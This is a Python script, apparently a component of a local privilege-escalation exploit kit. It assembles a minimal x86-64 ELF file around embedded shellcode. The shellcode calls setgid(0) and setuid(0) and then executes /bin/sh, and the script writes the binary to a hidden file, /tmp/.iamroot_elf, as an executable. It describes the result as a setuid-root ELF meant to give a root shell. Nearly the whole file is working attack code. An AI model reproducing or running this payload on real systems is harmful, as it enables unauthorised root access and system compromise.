#!/usr/bin/env python3
from __future__ import annotations

import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

SHELLCODE = (
    b"\x48\x31\xff"
    b"\x48\x31\xf6"
    b"\x48\x31\xd2"
    b"\x48\x31\xc0\xb0\x73\x0f\x05"
    b"\x48\x31\xc0\xb0\x77\x0f\x05"
    b"\x48\xbb/bin/sh\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x48\x31\xc0\xb0\x3b\x0f\x05"
)

BASE = 0x400000

def build_elf() -> bytes:
    ehdr_size = 0x40
    phdr_size = 0x38
    code = SHELLCODE + b"\xcc"
    seg_filesz = ehdr_size + phdr_size + len(code)
    seg_memsz = seg_filesz

    e_entry = BASE + ehdr_size + phdr_size
    phdr = struct.pack(
        "<IIQQQQQQ",
        1,
        5,
        0,
        BASE,
        BASE,
        seg_filesz,
        seg_memsz,
        0x1000,
    )

    ehdr = struct.pack(
        "<4sBBBBB7xHHIQQQIHHHHHH",
        b"\x7fELF",
        2, 1, 1, 0, 0,
        2,
        0x3E,
        1,
        e_entry,
        ehdr_size,
        0,
        0,
        ehdr_size,
        phdr_size,
        1,
        0,
        0,
        0,
    )
    return ehdr + phdr + code

def main() -> int:
    if "--selftest" in sys.argv:
        common.info("elfgen.py selftest OK")
        blob = build_elf()
        assert blob[:4] == b"\x7fELF"
        assert struct.unpack_from("<H", blob, 0x10)[0] == 2
        common.good(f"ELF {len(blob)} bytes, entry at code start")
        return 0

    out = "/tmp/.iamroot_elf"
    for i, a in enumerate(sys.argv):
        if a == "--out" and i + 1 < len(sys.argv):
            out = sys.argv[i + 1]
    blob = build_elf()
    with open(out, "wb") as fh:
        fh.write(blob)
    os.chmod(out, 0o755)
    common.good(f"wrote minimal setuid-root ELF to {out} ({len(blob)} bytes)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
